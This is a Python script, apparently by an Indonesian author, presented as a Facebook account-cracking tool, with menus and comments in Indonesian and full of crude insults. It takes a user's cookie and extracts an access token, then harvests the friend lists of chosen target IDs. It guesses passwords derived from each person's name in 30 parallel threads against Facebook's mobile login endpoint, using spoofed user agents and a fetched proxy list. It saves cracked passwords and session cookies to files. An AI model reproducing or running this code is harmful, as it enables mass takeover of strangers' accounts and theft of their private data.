
# Script by irfan azhura
#GH : irfan-XD
# Watsapp :082268478601
#silah kan chat wa saya jika ingin bertanya

#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()

ugen=['NokiaX2-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

ugen2=['Mozila/5.0 (Linux; U; Android 9; en-us; GT-G184C) ApplewebKit/527.36 (KHTML, like Gecko) Crome/84.0.4576.95 Mobile Safari/537.36']

cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/TheSpeedX/PROXY-List/blob/master/socks5.txt').text
	open('.socks5.txt','w').write(prox)
except Exception as e:
	exit(e)
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mirfan_XD_ganteng')
prox=open('.socks5.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
njir = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def irfan_XD(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	irfan_XD(f'''\t{h}                                             
 ░█░░░▀█▀░▀█▀░█▀▀░░░█░█░▀█░
 ░█░░░░█░░░█░░█▀▀░░░▀▄▀░░█░
 ░▀▀▀░▀▀▀░░▀░░▀▀▀░░░░▀░░▀▀▀
{P} >>> {m}•{k}•{h}•{x} TOLS CRACK FACEBOOK {m}•{k}•{h}•{x}  <<< {x}''')
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# jaringan lo gk ada kontol '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t       »» METHODE [green] • [white] LOGIN «« '))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}∆{x}] COKIIE :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL [{m} WARNING!!]{x} PASTIKAN DEVICE DAN KARTU KALIAN DALAM KEADAAN STABIL, JNGAN TERLALU SERING CRACK AGAR TERHINDAR DARI SPAM IP ! ...jalan kan ulang perintah untuk masuk ke script ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL!! COKIIE TIDAK BERFUNGSI !!%s'%(x,k,x,m,x))
		exit()

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	
	print('')

	try:cek_data = requests.get("http://ip-api.com/json/").json()

	except:cek_data = {'-'}
	try:ipcek = cek_data["isp"]
	except:garis = {'-'}
	try:kota = cek_data["city"]
	except:garis = {'-'}
	io = '''[bold white]Author  : irfan XD \nVersion : 1.0.0[bold white]\nstatus  : Jomblo[bold white]\nWatsapp :+6282268478601'''
	oi = nel(io, style='white')
	cetak(nel(oi, title='»⟨info author⟩«'))
	cetak(nel('           \tWELCOME [green]%s[white] GANTENG'%(my_name)))
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	print('⟩»  1. Crack Publik ')
	print('⟩»  0.keluar       ')
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	irfan_XD_ganteng = input(f'Pilih : ')
	print('')
	if irfan_XD_ganteng in ['1']:
		 dump_massal()
	elif irfan_XD_ganteng in ['X']:
		gid()
	elif irfan_XD_ganteng in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('Success Logout+Delete Cookies ')
		exit()
	else:
		print(' Kontolllll ')
		back()
def irfan_XD_ganteng():
	print(f' lagi perbaikan cil!!! {x}')
	time.sleep(2)
	

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		irfan_XD_ganteng = int(input('✓ JUMLAH TARGET MINIMAL 10 ⟩»:'))
	except ValueError:
		print('× goblok ')
		exit()
	if irfan_XD_ganteng<1 or irfan_XD_ganteng>100:
		print('× Gagal ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(irfan_XD_ganteng):
		yz+=1
		kl = input('⟩» ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('CEK JARINGAN DULU CIL ')
			exit()
	try:
		print('')
		print(f'⟩» {x}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' Tolol ')
		back()
	except (KeyError,IOError):
		print(f'⟩»{k} pertemanan nya private anjing {x}')
		time.sleep(3)
		back()

def setting():
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	print('⟩»01.old')
	print('⟩»02.new')
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	hu = input('⟩» Pilih : ')

	if hu in ['1','01']:

		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('Goblok amat sih cill ')
		exit()
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	print('⟩» 1. Mobile \x1b[1;92mrecommended\33[m ')
	print('⟩» 2. Mbasic \x1b[1;92mrecommended\33[m')
	print('⟩» 3. free \x1b[1;9mnot recommended\33[m') 
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	print('')
	irfan_XD_ganteng = input('⟩» Pilih : ')
	if irfan_XD_ganteng in ['1','01']:
		method.append('mobile')
	elif irfan_XD_ganteng in ['2','02']:
		method.append('mbasic')
	elif irfan_XD_ganteng in ['3','03']:
		method.append('free')
	elif irfan_XD_ganteng in ['4','04']:
		method.append('touch')
	else:
		method.append('mobile')
	print('')

	irfan_XD_ganteng=input('⟩» KETIK Y JIKA INGIN MENAMBAH KAN PASSWORD TAMBAHAN  ( Y/t ) ')
	if irfan_XD_ganteng in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('⟩» PASSWORD TAMBAHAN  : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>>  CRACK SEDANG BERLANGSUNG   <<<<< ')
	print('')
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	print(f'∆{h}OK{x}: {h}OK/%s {x}'%(okc))
	print(f'∆{k}CP{x}: {k}CP/%s {x}'%(cpc))
	print('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
	print(f'⟩»Mode Pesawat Setiap {m}1k{x} Id untuk mencegah spam pada ip\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,"m.facebook.com")
			elif 'free' in method:
				pool.submit(crack,idf,pwv,"free.facebook.com")
			elif 'touch' in method:
				pool.submit(crack,idf,pwv,"touch.facebook.com")
			elif 'mbasic' in method:
				pool.submit(crack,idf,pwv,"mbasic.facebook.com")
			else:
				pool.submit(crack,idf,pwv,"m.facebook.com")
	print('')
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('⟩» KETIK Y JIKA INGIN CRACK LAGI!!! ( Y/t ) ? ')
	irfan_XD_ganteng = input('⟩» Pilih : ')
	if irfan_XD_ganteng in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k}KONTOLLLLLL {x} << ')
		time.sleep(2)
		exit()

def crack(idf,pwv,link):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[IRFAN-XD] [{loop}{len(id)} ]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua = random.choice(ugen)
	kikuk = f'sb=NXolY_GqeP3TEkV2S-hlzM9-;datr=ggUsY_y9ky2XYCY7XkSCoV3W;locale=id_ID;wd=450x825;c_user={uid};xs=47:Fx2r2oKszDUvvw:2:1664489619:-1:11225;fr=0bz3SE6xQbD7yfljB.AWWivr9jnn5lkO4f8hS48laUm-w.BjJXp0.Iz.AAA.0.0.BjNhiT.AWXACXAXPgY;m_page_voice={uid};'
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{kk}EMAIL{P}  : {kk}{idf}{P}          \n{kk}SANDI{P}  : {kk}{pw}           {P}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ua+'|\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{hh}EMAIL{P}  : {hh}{idf}{P}          \n{hh}SANDI{P}  : {hh}{pw}          {P}\n{hh}COOKIE{P} : {hh}{kuki}{P}\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'|\n')
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> PRIKOD YA DEK <<<<<<#
#>>>>> IRFAN GANTENG NYA DILUAR NALAR CUY <<<<<#
#Pukimak#
#